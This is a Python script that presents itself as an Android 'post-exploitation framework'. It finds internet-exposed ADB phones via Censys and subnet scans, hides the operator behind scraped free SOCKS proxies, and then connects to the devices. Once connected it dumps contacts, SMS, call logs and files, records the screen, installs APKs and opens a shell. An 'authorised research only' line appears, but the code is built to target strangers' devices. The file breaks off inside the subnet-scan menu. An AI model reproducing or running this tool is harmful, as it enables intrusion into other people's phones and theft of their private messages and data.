#!/usr/bin/env python3
"""
Android Security Editor - Post-Exploitation Framework
- Censys.io internet search using Personal Access Token (PAT)
- Local subnet & direct IP scanning
- iOS device detection via libimobiledevice (optional)
- Full Android post-exploitation menu + HTML reporting
For authorised security research only.
"""

import subprocess
import os
import sys
import time
import socket
import json
import random
import re
import ipaddress
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# ------------------------------------------------------------------
# Third-party imports & API availability
# ------------------------------------------------------------------
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Censys v2 uses Personal Access Token (PAT)
CENSYS_AVAILABLE = False
try:
    from censys.search import CensysHosts
    CENSYS_AVAILABLE = True
except ImportError:
    pass

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORS = True
except ImportError:
    COLORS = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = ''
    class Style:
        RESET_ALL = ''

# ------------------------------------------------------------------
# Port definitions (Android ADB + iOS service ports)
# ------------------------------------------------------------------
ADB_PORTS = list(range(5555, 5571))          # 5555-5570 (16 ports)
IOS_PORTS = [
    62078, 22, 44, 443,
    8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010,
    8080, 8443, 2222, 8888, 9000,
]
ALL_SCAN_PORTS = sorted(set(ADB_PORTS + IOS_PORTS))

# ------------------------------------------------------------------
# Helper functions
# ------------------------------------------------------------------
def print_info(msg):
    print(f"{Fore.CYAN}[*] {msg}{Style.RESET_ALL}" if COLORS else f"[*] {msg}")

def print_success(msg):
    print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}" if COLORS else f"[+] {msg}")

def print_error(msg):
    print(f"{Fore.RED}[-] {msg}{Style.RESET_ALL}" if COLORS else f"[-] {msg}")

def print_warning(msg):
    print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}" if COLORS else f"[!] {msg}")

def start_adb_server():
    subprocess.run(["adb", "start-server"], capture_output=True)

def run_adb(command, serial=None):
    cmd = ["adb"]
    if serial:
        cmd.extend(["-s", serial])
    cmd.extend(command.split())
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "Command timed out", 1
    except FileNotFoundError:
        print_error("ADB not found. Install Android Platform Tools.")
        return "", "ADB missing", 1

# ------------------------------------------------------------------
# Session management (unchanged)
# ------------------------------------------------------------------
class Session:
    def __init__(self, device_serial):
        self.device_serial = device_serial
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.session_dir = Path(f"workspace/session_{self.timestamp}")
        self.session_dir.mkdir(parents=True, exist_ok=True)
        self.actions = []
        self.device_info = {}
        self.contacts_count = 0
        self.sms_count = 0
        self.call_logs_count = 0
        self.apps_list = []
        self.root_found = False
        self.patch_date = ""
        self.debuggable_apps = []

    def log_action(self, action, result="Success"):
        self.actions.append((action, result))
        print_info(f"Action: {action} -> {result}")

    def save_file(self, data, filename):
        filepath = self.session_dir / filename
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(data)
        return filepath

    def generate_report(self):
        report_file = self.session_dir / "report.html"
        html = f"""
        <!DOCTYPE html>
        <html>
        <head><title>Android Security Editor Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            h1 {{ color: #d32f2f; }}
            h2 {{ color: #1976d2; }}
            table {{ border-collapse: collapse; width: 100%; margin-bottom: 20px; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            th {{ background-color: #f2f2f2; }}
            .success {{ color: green; }}
            .warning {{ color: orange; }}
            .error {{ color: red; }}
        </style>
        </head>
        <body>
        <h1>Android Security Editor - Audit Report</h1>
        <p><strong>Session:</strong> {self.timestamp}</p>
        <p><strong>Device Serial:</strong> {self.device_serial}</p>

        <h2>Device Information</h2>
        <table>
        """
        for key, value in self.device_info.items():
            html += f"<tr><th>{key}</th><td>{value}</td>"
        html += "</table>"

        html += f"""
        <h2>Extracted Data Summary</h2>
        <ul>
            <li>Contacts: {self.contacts_count}</li>
            <li>SMS messages: {self.sms_count}</li>
            <li>Call logs: {self.call_logs_count}</li>
            <li>Installed apps: {len(self.apps_list)}</li>
            <li>Root detected: {'Yes' if self.root_found else 'No'}</li>
        </ul>

        <h2>Security Recommendations</h2>
        <ul>
        """
        if self.root_found:
            html += "<li class='warning'>⚠️ Device is rooted. This poses a significant security risk as it disables many Android security features.</li>"
        if self.patch_date:
            try:
                patch = datetime.strptime(self.patch_date, "%Y-%m-%d")
                age = (datetime.now() - patch).days
                if age > 180:
                    html += f"<li class='warning'>⚠️ Security patch is {age} days old ({self.patch_date}). Update to the latest patch.</li>"
                else:
                    html += f"<li class='success'>✓ Security patch is up to date ({self.patch_date}).</li>"
            except:
                pass
        if self.debuggable_apps:
            html += f"<li class='warning'>⚠️ {len(self.debuggable_apps)} debuggable apps found. These apps can be easier to exploit.</li>"

        html += """
            <li>Ensure USB debugging is disabled when not in use.</li>
            <li>Do not enable ADB over Wi-Fi on untrusted networks.</li>
            <li>Keep the device updated with the latest security patches.</li>
            <li>Avoid installing apps from unknown sources.</li>
        </ul>

        <h2>Action Log</h2>
        <table>
        <tr><th>Action</th><th>Result</th></tr>
        """
        for action, result in self.actions:
            result_class = "success" if result == "Success" else "error" if "Failed" in result else "warning"
            html += f"<tr><td>{action}</td><td class='{result_class}'>{result}</td></tr>"
        html += """
        </table>
        </body>
        </html>
        """
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(html)
        print_success(f"Report generated: {report_file}")
        return report_file

# ------------------------------------------------------------------
# Proxy Manager (unchanged)
# ------------------------------------------------------------------
class ProxyManager:
    def __init__(self):
        self.sources = [
            "https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/main/proxies.txt",
            "https://raw.githubusercontent.com/ClearProxy/checked-proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all",
            "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks5.txt"
        ]

    def fetch_all_proxies(self):
        print_info("Fetching proxy list...")
        all_proxies = []
        for source in self.sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    lines = response.text.strip().split('\n')
                    for line in lines:
                        line = line.strip()
                        if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', line):
                            host, port = line.split(':')
                            all_proxies.append({"host": host, "port": int(port)})
                    print_success(f"Fetched from {source}")
            except Exception as e:
                print_warning(f"Failed from {source}: {e}")
        # Deduplicate
        seen = set()
        deduped = []
        for p in all_proxies:
            key = f"{p['host']}:{p['port']}"
            if key not in seen:
                seen.add(key)
                deduped.append(p)
        return deduped

    def test_proxy(self, proxy):
        try:
            proxies = {'http': f"socks5://{proxy['host']}:{proxy['port']}",
                       'https': f"socks5://{proxy['host']}:{proxy['port']}"}
            r = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=10)
            return r.status_code == 200
        except:
            return False

    def get_first_working_proxy(self):
        proxies = self.fetch_all_proxies()
        if not proxies:
            return None
        print_info("Testing proxies one by one...")
        for proxy in proxies:
            print_info(f"Testing {proxy['host']}:{proxy['port']}...")
            if self.test_proxy(proxy):
                print_success(f"✓ Working proxy: {proxy['host']}:{proxy['port']}")
                return proxy
            else:
                print_warning(f"✗ Failed: {proxy['host']}:{proxy['port']}")
        return None

# ------------------------------------------------------------------
# Device info extraction (Android only)
# ------------------------------------------------------------------
def get_device_type(serial):
    stdout, _, _ = run_adb("shell getprop ro.build.characteristics", serial)
    chars = stdout.strip().lower()
    if "tablet" in chars:
        return "Tablet"
    elif "phone" in chars:
        return "Phone"
    stdout, _, _ = run_adb("shell wm density", serial)
    if "Physical density: 160" in stdout or "Physical density: 213" in stdout:
        return "Tablet (low density)"
    else:
        return "Phone (default)"

def get_device_model(serial):
    stdout, _, _ = run_adb("shell getprop ro.product.model", serial)
    return stdout.strip()

def get_manufacturer(serial):
    stdout, _, _ = run_adb("shell getprop ro.product.manufacturer", serial)
    return stdout.strip()

def get_android_version(serial):
    stdout, _, _ = run_adb("shell getprop ro.build.version.release", serial)
    return stdout.strip()

def get_security_patch(serial):
    stdout, _, _ = run_adb("shell getprop ro.build.version.security_patch", serial)
    return stdout.strip()

def get_build_fingerprint(serial):
    stdout, _, _ = run_adb("shell getprop ro.build.fingerprint", serial)
    return stdout.strip()

def get_imei(serial):
    stdout2, _, _ = run_adb("shell dumpsys iphonesubinfo", serial)
    match = re.search(r'Device ID=(\d+)', stdout2)
    if match:
        return match.group(1)
    return "N/A (requires permission)"

def get_battery_level(serial):
    stdout, _, _ = run_adb("shell dumpsys battery | grep level", serial)
    match = re.search(r'level:\s*(\d+)', stdout)
    return match.group(1) if match else "Unknown"

def get_debuggable_apps(serial):
    stdout, _, _ = run_adb("shell pm list packages", serial)
    packages = [line.replace("package:", "").strip() for line in stdout.splitlines() if line]
    debuggable = []
    for pkg in packages[:50]:
        out, _, _ = run_adb(f"shell dumpsys package {pkg} | grep debuggable", serial)
        if "debuggable=true" in out:
            debuggable.append(pkg)
    return debuggable

def check_root(serial):
    stdout, _, _ = run_adb("shell getprop ro.build.tags", serial)
    if "test-keys" in stdout:
        return True
    stdout, _, _ = run_adb("shell which su", serial)
    return bool(stdout.strip())

# ------------------------------------------------------------------
# iOS detection and info gathering (uses libimobiledevice if available)
# ------------------------------------------------------------------
def check_ios_device(ip):
    try:
        result = subprocess.run(["ideviceinfo", "-u", ip], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            info = {}
            for line in result.stdout.splitlines():
                if ':' in line:
                    key, val = line.split(':', 1)
                    info[key.strip()] = val.strip()
            return info
    except:
        pass
    return None

def get_ios_info(ip):
    info = check_ios_device(ip)
    if info:
        return {
            "Device Type": "iOS Device",
            "Model": info.get("ProductType", "Unknown"),
            "Manufacturer": "Apple Inc.",
            "iOS Version": info.get("ProductVersion", "Unknown"),
            "Device Name": info.get("DeviceName", "Unknown"),
            "Serial": info.get("SerialNumber", "Unknown"),
            "UDID": info.get("UniqueDeviceID", "Unknown")[:16] + "...",
        }
    else:
        return {
            "Device Type": "iOS Device (libimobiledevice missing)",
            "Model": "Unknown (install libimobiledevice for full details)",
            "Manufacturer": "Apple Inc.",
            "iOS Version": "Unknown",
            "Note": "Install libimobiledevice (e.g., `brew install libimobiledevice` on macOS, `sudo apt install libimobiledevice-utils` on Linux) to get full device info"
        }

# ------------------------------------------------------------------
# Android data extraction functions (unchanged)
# ------------------------------------------------------------------
def get_contacts(serial, session):
    print_info("Extracting contacts...")
    stdout, _, code = run_adb("shell content query --uri content://contacts/phones/", serial)
    if code != 0 or not stdout:
        session.log_action("Extract Contacts", "Failed - no permission or no contacts")
        return
    contacts = []
    for line in stdout.splitlines():
        if "name=" in line and "number=" in line:
            parts = line.split(",")
            name = number = ""
            for part in parts:
                if part.strip().startswith("name="):
                    name = part.split("=")[1].strip()
                elif part.strip().startswith("number="):
                    number = part.split("=")[1].strip()
            if name and number:
                contacts.append(f"{name} : {number}")
    if contacts:
        filename = f"contacts_{session.timestamp}.txt"
        session.save_file("\n".join(contacts), filename)
        session.contacts_count = len(contacts)
        session.log_action("Extract Contacts", f"Saved {len(contacts)} contacts to {filename}")
        print_success(f"Saved {len(contacts)} contacts")
    else:
        session.log_action("Extract Contacts", "No contacts found")

def get_sms(serial, session):
    print_info("Extracting SMS...")
    stdout, _, code = run_adb("shell content query --uri content://sms/inbox", serial)
    if code != 0 or not stdout:
        session.log_action("Extract SMS", "Failed")
        return
    filename = f"sms_{session.timestamp}.txt"
    session.save_file(stdout, filename)
    session.sms_count = len(stdout.splitlines())
    session.log_action("Extract SMS", f"Saved {session.sms_count} messages to {filename}")
    print_success("SMS saved")

def get_call_logs(serial, session):
    print_info("Extracting call logs...")
    stdout, _, code = run_adb("shell content query --uri content://call_log/calls", serial)
    if code != 0 or not stdout:
        session.log_action("Extract Call Logs", "Failed")
        return
    filename = f"call_logs_{session.timestamp}.txt"
    session.save_file(stdout, filename)
    session.call_logs_count = len(stdout.splitlines())
    session.log_action("Extract Call Logs", f"Saved {session.call_logs_count} logs to {filename}")
    print_success("Call logs saved")

def list_installed_apps(serial, session):
    stdout, _, _ = run_adb("shell pm list packages", serial)
    packages = [line.replace("package:", "").strip() for line in stdout.splitlines() if line]
    session.apps_list = packages
    filename = f"app_list_{session.timestamp}.txt"
    session.save_file("\n".join(packages), filename)
    session.log_action("List Apps", f"Found {len(packages)} apps, saved to {filename}")
    print_info(f"Total apps: {len(packages)} (saved to {filename})")

def install_apk(serial, session):
    path = input("Path to APK: ").strip()
    if not os.path.exists(path):
        session.log_action("Install APK", f"File not found: {path}")
        return
    print_info(f"Installing {path}...")
    stdout, stderr, code = run_adb(f"install -r \"{path}\"", serial)
    if "Success" in stdout:
        session.log_action("Install APK", f"Successfully installed {os.path.basename(path)}")
        print_success("APK installed.")
    else:
        session.log_action("Install APK", f"Failed: {stderr}")
        print_error(f"Install failed: {stderr}")

def uninstall_app(serial, session):
    pkg = input("Package name: ").strip()
    if not pkg:
        return
    confirm = input(f"Uninstall {pkg}? (y/n): ").strip().lower()
    if confirm != 'y':
        return
    stdout, stderr, code = run_adb(f"uninstall {pkg}", serial)
    if "Success" in stdout:
        session.log_action("Uninstall App", f"Uninstalled {pkg}")
        print_success(f"Uninstalled {pkg}")
    else:
        session.log_action("Uninstall App", f"Failed: {stderr}")
        print_error(f"Uninstall failed: {stderr}")

def start_app(serial, session):
    pkg = input("Package name: ").strip()
    if not pkg:
        return
    stdout, stderr, code = run_adb(f"shell monkey -p {pkg} 1", serial)
    if "Events injected" in stdout or code == 0:
        session.log_action("Start App", f"Launched {pkg}")
        print_success(f"Launched {pkg}")
    else:
        session.log_action("Start App", f"Failed: {stderr}")
        print_error(f"Failed to launch: {stderr}")

def take_screenshot(serial, session):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote = f"/sdcard/screenshot_{ts}.png"
    local = session.session_dir / f"screenshot_{ts}.png"
    run_adb(f"shell screencap -p {remote}", serial)
    _, _, code = run_adb(f"pull {remote} {local}", serial)
    if code == 0:
        session.log_action("Take Screenshot", f"Saved to {local.name}")
        print_success("Screenshot saved")
        run_adb(f"shell rm {remote}", serial)
    else:
        session.log_action("Take Screenshot", "Failed")
        print_error("Screenshot failed.")

def screen_record(serial, session):
    try:
        dur = int(input("Duration (sec, max 180): "))
        if dur > 180:
            print_error("Max 180 seconds.")
            return
    except:
        print_error("Invalid number.")
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote = f"/sdcard/recording_{ts}.mp4"
    local = session.session_dir / f"recording_{ts}.mp4"
    print_info(f"Recording for {dur} seconds...")
    proc = subprocess.Popen(
        ["adb", "-s", serial, "shell", f"screenrecord --time-limit {dur} {remote}"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(dur + 2)
    proc.terminate()
    _, _, code = run_adb(f"pull {remote} {local}", serial)
    run_adb(f"shell rm {remote}", serial)
    if code == 0:
        session.log_action("Screen Recording", f"Saved {dur}s to {local.name}")
        print_success("Recording saved")
    else:
        session.log_action("Screen Recording", "Failed")
        print_error("Recording failed.")

def pull_file(serial, session):
    remote = input("Remote path: ").strip()
    if not remote:
        return
    local = input("Local path (default: session dir with same name): ").strip()
    if not local:
        local = session.session_dir / Path(remote).name
    else:
        local = Path(local)
    _, _, code = run_adb(f"pull \"{remote}\" \"{local}\"", serial)
    if code == 0:
        session.log_action("Pull File", f"Pulled {remote} to {local}")
        print_success("File pulled")
    else:
        session.log_action("Pull File", "Failed")
        print_error("Pull failed.")

def push_file(serial, session):
    local = input("Local file: ").strip()
    if not os.path.exists(local):
        print_error("File not found.")
        return
    remote = input("Remote destination: ").strip()
    if not remote:
        return
    _, _, code = run_adb(f"push \"{local}\" \"{remote}\"", serial)
    if code == 0:
        session.log_action("Push File", f"Pushed {local} to {remote}")
        print_success("File pushed.")
    else:
        session.log_action("Push File", "Failed")
        print_error("Push failed.")

def send_sms(serial, session):
    number = input("Phone number: ").strip()
    if not number:
        return
    msg = input("Message: ").strip()
    intent = f"am start -a android.intent.action.SENDTO -d sms:{number} --es sms_body \"{msg}\""
    run_adb(f"shell {intent}", serial)
    session.log_action("Send SMS", f"Opened SMS intent to {number}")
    print_success("SMS intent launched. Press send on device.")

def toggle_wifi(serial, session):
    stdout, _, _ = run_adb("shell settings get global wifi_on", serial)
    is_on = stdout.strip() == "1"
    if is_on:
        confirm = input("Wi-Fi is ON. Turn OFF? (y/n): ").strip().lower()
        if confirm == 'y':
            run_adb("shell svc wifi disable", serial)
            session.log_action("Toggle Wi-Fi", "Turned OFF")
            print_success("Wi-Fi disabled.")
    else:
        confirm = input("Wi-Fi is OFF. Turn ON? (y/n): ").strip().lower()
        if confirm == 'y':
            run_adb("shell svc wifi enable", serial)
            session.log_action("Toggle Wi-Fi", "Turned ON")
            print_success("Wi-Fi enabled.")

def reboot_device(serial, session):
    confirm = input("Reboot device? (y/n): ").strip().lower()
    if confirm == 'y':
        run_adb("reboot", serial)
        session.log_action("Reboot Device", "Initiated")
        print_success("Rebooting...")

def power_off(serial, session):
    confirm = input("Power off device? (y/n): ").strip().lower()
    if confirm == 'y':
        run_adb("shell reboot -p", serial)
        session.log_action("Power Off", "Initiated")
        print_success("Powering off...")

def get_logcat(serial, session):
    print_info("Pulling logcat...")
    stdout, _, code = run_adb("logcat -d", serial)
    if code == 0 and stdout:
        filename = f"logcat_{session.timestamp}.txt"
        session.save_file(stdout, filename)
        session.log_action("Get Logcat", f"Saved to {filename}")
        print_success("Logcat saved")
    else:
        session.log_action("Get Logcat", "Failed")
        print_error("Failed to get logcat.")

def root_check(serial, session):
    rooted = check_root(serial)
    session.root_found = rooted
    if rooted:
        session.log_action("Root Check", "Device is ROOTED")
        print_warning("Device appears ROOTED.")
    else:
        session.log_action("Root Check", "Device not rooted")
        print_success("No obvious root signs.")

def interactive_shell(serial, session):
    print_info("Opening interactive shell. Type 'exit' to return.")
    subprocess.run(["adb", "-s", serial, "shell"])
    session.log_action("Interactive Shell", "Opened and closed")

# ------------------------------------------------------------------
# Network & discovery utilities
# ------------------------------------------------------------------
def is_port_open(ip, port, proxy_host=None, proxy_port=None, timeout=1):
    if proxy_host and proxy_port:
        if not SOCKS_AVAILABLE:
            return False
        try:
            original_socket = socket.socket
            socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port)
            socket.socket = socks.socksocket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            socket.socket = original_socket
            return result == 0
        except:
            return False
    else:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

def scan_ip_ports(ip, ports, proxy_host=None, proxy_port=None):
    open_ports = []
    def check_port(p):
        if is_port_open(ip, p, proxy_host, proxy_port, timeout=1):
            open_ports.append(p)
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(check_port, ports)
    return open_ports

def scan_subnet_aggressive(subnet, ports, proxy_host=None, proxy_port=None, max_workers=100):
    print_info(f"Aggressively scanning {subnet} (ports {ports[0]}-{ports[-1]})" +
               (f" through proxy" if proxy_host else ""))
    network = ipaddress.ip_network(subnet, strict=False)
    results = []
    def scan_ip(ip_str):
        open_ports = scan_ip_ports(ip_str, ports, proxy_host, proxy_port)
        if open_ports:
            return (ip_str, open_ports)
        return None
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(scan_ip, str(ip)): ip for ip in network.hosts()}
        for future in as_completed(futures):
            res = future.result()
            if res:
                results.append(res)
    return results

def find_open_adb_port(ip, proxy_host=None, proxy_port=None):
    for port in ADB_PORTS:
        if is_port_open(ip, port, proxy_host, proxy_port):
            return port
    return None

def detect_device_os(open_ports):
    adb_ports = [p for p in open_ports if p in ADB_PORTS]
    ios_ports = [p for p in open_ports if p in IOS_PORTS]
    if adb_ports:
        return "Android"
    elif ios_ports:
        return "iOS"
    else:
        return "Unknown"

# ------------------------------------------------------------------
# Censys search using Personal Access Token (PAT)
# ------------------------------------------------------------------
def censys_search_adb_devices():
    if not CENSYS_AVAILABLE:
        print_error("Censys SDK not installed. Install with: pip install censys")
        return []
    token = input("Enter your Censys Personal Access Token (PAT): ").strip()
    if not token:
        print_error("Token required. Generate a PAT in your Censys account (API Access page).")
        return []

    query = 'services.service_name: "ADB"'
    print_info(f"Searching Censys with query: {query}")
    try:
        c = CensysHosts(api_key=token)   # PAT is passed as api_key
        devices = []
        # Use search() which returns an iterator
        for page in c.search(query, per_page=25):
            for result in page:
                ip = result.get('ip', 'Unknown')
                location = result.get('location', {})
                country = location.get('country', 'Unknown')
                print_success(f"Found {ip} (country: {country})")
                devices.append((ip, result))
            if len(devices) >= 25:
                break
        print_success(f"Found {len(devices)} ADB-exposed devices on Censys")
        return devices
    except Exception as e:
        print_error(f"Censys API error: {e}")
        return []

# ------------------------------------------------------------------
# Main session handlers
# ------------------------------------------------------------------
def run_android_session(serial, proxy_host, proxy_port):
    session = Session(serial)
    print_info("Gathering Android device information...")
    session.device_info["Device Type"] = get_device_type(serial)
    session.device_info["Model"] = get_device_model(serial)
    session.device_info["Manufacturer"] = get_manufacturer(serial)
    session.device_info["Android Version"] = get_android_version(serial)
    session.device_info["Security Patch"] = get_security_patch(serial)
    session.patch_date = session.device_info["Security Patch"]
    session.device_info["Build Fingerprint"] = get_build_fingerprint(serial)
    session.device_info["IMEI/Device ID"] = get_imei(serial)
    session.device_info["Battery Level"] = f"{get_battery_level(serial)}%"
    session.device_info["Root Status"] = "Rooted" if check_root(serial) else "Not rooted"
    session.debuggable_apps = get_debuggable_apps(serial)
    session.device_info["Debuggable Apps"] = ", ".join(session.debuggable_apps[:10]) or "None"

    print(f"\n{Fore.GREEN}===== DEVICE INFORMATION ====={Style.RESET_ALL}")
    for key, val in session.device_info.items():
        print(f"{Fore.CYAN}{key}:{Style.RESET_ALL} {val}")
    session.log_action("Device Info", "Collected")

    while True:
        print(f"\n{Fore.MAGENTA}===== ANDROID SECURITY EDITOR MENU ====={Style.RESET_ALL}")
        print("1.  Dump Contacts")
        print("2.  Dump SMS")
        print("3.  Dump Call Logs")
        print("4.  List Installed Apps")
        print("5.  Install APK")
        print("6.  Uninstall App")
        print("7.  Start App")
        print("8.  Take Screenshot")
        print("9.  Screen Recording")
        print("10. Pull File")
        print("11. Push File")
        print("12. Send SMS (intent)")
        print("13. Toggle Wi-Fi")
        print("14. Reboot Device")
        print("15. Power Off")
        print("16. Get Logcat")
        print("17. Root Check")
        print("18. Interactive ADB Shell")
        print("0.  Disconnect, Generate Report, and Return to Target Selection")
        choice = input(f"{Fore.CYAN}Select: {Style.RESET_ALL}").strip()

        if choice == "1":
            get_contacts(serial, session)
        elif choice == "2":
            get_sms(serial, session)
        elif choice == "3":
            get_call_logs(serial, session)
        elif choice == "4":
            list_installed_apps(serial, session)
        elif choice == "5":
            install_apk(serial, session)
        elif choice == "6":
            uninstall_app(serial, session)
        elif choice == "7":
            start_app(serial, session)
        elif choice == "8":
            take_screenshot(serial, session)
        elif choice == "9":
            screen_record(serial, session)
        elif choice == "10":
            pull_file(serial, session)
        elif choice == "11":
            push_file(serial, session)
        elif choice == "12":
            send_sms(serial, session)
        elif choice == "13":
            toggle_wifi(serial, session)
        elif choice == "14":
            reboot_device(serial, session)
        elif choice == "15":
            power_off(serial, session)
        elif choice == "16":
            get_logcat(serial, session)
        elif choice == "17":
            root_check(serial, session)
        elif choice == "18":
            interactive_shell(serial, session)
        elif choice == "0":
            disconnect_device(serial)
            session.log_action("Session End", "Disconnected")
            session.generate_report()
            print_info(f"All data saved in: {session.session_dir}")
            return
        else:
            print_error("Invalid option.")

def run_ios_session(ip, open_ports):
    print_info(f"iOS device detected at {ip}")
    print_info(f"Open ports: {', '.join(str(p) for p in open_ports)}")
    print_info("Attempting to gather device info via libimobiledevice...")
    info = get_ios_info(ip)
    print(f"\n{Fore.GREEN}===== DEVICE INFORMATION (iOS) ====={Style.RESET_ALL}")
    for key, val in info.items():
        print(f"{Fore.CYAN}{key}:{Style.RESET_ALL} {val}")
    if "libimobiledevice missing" in info.get("Device Type", ""):
        print_warning("Install libimobiledevice (e.g., `brew install libimobiledevice` on macOS, `sudo apt install libimobiledevice-utils` on Linux) to get full iOS device details and potential pairing.")
    input("Press Enter to return to target selection...")

def disconnect_device(serial):
    run_adb(f"disconnect {serial}")
    print_info(f"Disconnected from {serial}")

def connect_device(ip, port, retries=3):
    ip_port = f"{ip}:{port}"
    print_info(f"Connecting to {ip_port}...")
    for attempt in range(1, retries+1):
        stdout, stderr, code = run_adb(f"connect {ip_port}")
        if "connected" in stdout.lower():
            print_success(f"Connected to {ip_port}")
            return ip_port
        print_warning(f"Attempt {attempt}/{retries} failed: {stderr or stdout}")
        time.sleep(2)
    return None

# ------------------------------------------------------------------
# Main framework with Censys (PAT), direct IP & subnet scanning
# ------------------------------------------------------------------
def display_banner():
    banner = f"""{Fore.RED}
    █████╗     ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗ 
   ██╔══██╗    ████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗
   ███████║    ██╔██╗ ██║██║  ██║██████╔╝██║   ██║██║██║  ██║
   ██╔══██║    ██║╚██╗██║██║  ██║██╔══██╗██║   ██║██║██║  ██║
   ██║  ██║    ██║ ╚████║██████╔╝██║  ██║╚██████╔╝██║██████╔╝
   ╚═╝  ╚═╝    ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝ 
{Style.RESET_ALL}
{Fore.YELLOW}              Android Security Editor{Style.RESET_ALL}
{Fore.CYAN}  Direct IP | Local Subnet | Censys.io (ADB) + Post-Exploitation{Style.RESET_ALL}
{Fore.RED}     iOS devices: install libimobiledevice for extended info{Style.RESET_ALL}
"""
    print(banner)

def main():
    if not COLORS:
        print("Tip: Install colorama for colored output: pip install colorama")
    if not SOCKS_AVAILABLE:
        print_error("PySocks not installed. Install with: pip install PySocks")
        sys.exit(1)
    if not REQUESTS_AVAILABLE:
        print_error("Requests not installed. Install with: pip install requests")
        sys.exit(1)

    display_banner()
    print_info("Proxy will be used for port scanning and device discovery.")
    print_info("ADB traffic is NOT automatically proxied. Use proxychains or VPN for full IP masking.")

    start_adb_server()

    # Proxy setup (first working proxy)
    proxy_mgr = ProxyManager()
    working_proxy = proxy_mgr.get_first_working_proxy()
    use_proxy = False
    proxy_host = proxy_port = None
    if working_proxy:
        use_proxy = True
        proxy_host = working_proxy['host']
        proxy_port = working_proxy['port']
        print_success(f"Using proxy: {proxy_host}:{proxy_port}")
    else:
        print_warning("No working proxy found. Proceeding without proxy.")

    # Outer loop: target selection
    while True:
        print("\nOptions:")
        print("1.  Connect to a specific IP (ADB port auto‑detect for Android)")
        print("2.  Aggressive subnet scan (Android & iOS detection)")
        print("3.  Scan Censys.io for ADB‑exposed devices (Android only)")
        print("0.  Exit")
        choice = input(f"{Fore.CYAN}Select: {Style.RESET_ALL}").strip()
        if choice == "0":
            print_info("Exiting Android Security Editor.")
            sys.exit(0)

        # ----- Option 1: direct IP -----
        if choice == "1":
            ip_input = input("Target IP (e.g., 192.168.1.100): ").strip()
            if not ip_input:
                print_error("No IP provided. Returning to menu.")
                continue
            # Check for Android (ADB)
            adb_port = find_open_adb_port(ip_input, proxy_host, proxy_port)
            if adb_port:
                serial = connect_device(ip_input, adb_port)
                if serial:
                    run_android_session(serial, proxy_host, proxy_port)
                continue
            # Not Android – check iOS
            print_info("No ADB port found. Checking for iOS devices...")
            open_ports = scan_ip_ports(ip_input, IOS_PORTS, proxy_host, proxy_port)
            if open_ports:
                os_type = detect_device_os(open_ports)
                if os_type == "iOS":
                    run_ios_session(ip_input, open_ports)
                else:
                    print_warning(f"Unknown device at {ip_input} with open ports: {open_ports}")
            else:
                print_error(f"No known service ports found on {ip_input}")

        # ----- Option 2: aggressive subnet scan -----
        elif choice == "2":
            subnet = input("Subnet (e.g., 192.168.1.0/24): ").strip()
            if not subnet:
                print_error("No subnet provided. Returning to menu.")
                continue
            print_info("Starting aggressive subnet scan (this may take a while)...")
            results = scan_subnet_aggressive(subnet, ALL_SCAN_PORTS, proxy_host, proxy_port)
            if not results:
                print_error("No devices found.")
                continue
            print_success("Found devices:")
            device_list = []
            for idx, (ip, open_ports) in enumerate(results, 1):
                os_type = detect_device_os(open_ports)
                if os_type == "Android":
                    adb_port = next((p for p in open_ports if p in ADB_PORTS), None)
                    desc = f"Android (ADB port {adb_port})"
                elif os_type == "iOS":
                    desc = f"iOS (ports: {', '.join(str(p) for p in open_ports if p in IOS_PORTS)})"
                else:
                    desc = f"Unknown device (ports: {', '.join(str(p) for p in open_ports)})"
                print(f"{idx}. {ip} - {desc}")
                device_list.append((ip, open_ports, os_type))
            try:
                sel = int(input("Select device to interact with (0 to skip): ")) - 1
                if sel < 0:
                    continue
                ip, open_ports, os_type = device_list[sel]
                if os_type == "Android":
                    adb_port = next((p for p in open_ports if p in ADB_PORTS), None)
                    if adb_port:
                        serial = connect_device(ip, adb_port)
                        if serial:
                            run_android_session(serial, proxy_host, proxy_port)
                elif os_type == "iOS":
                    run_ios_session(ip, open_ports)
                else:
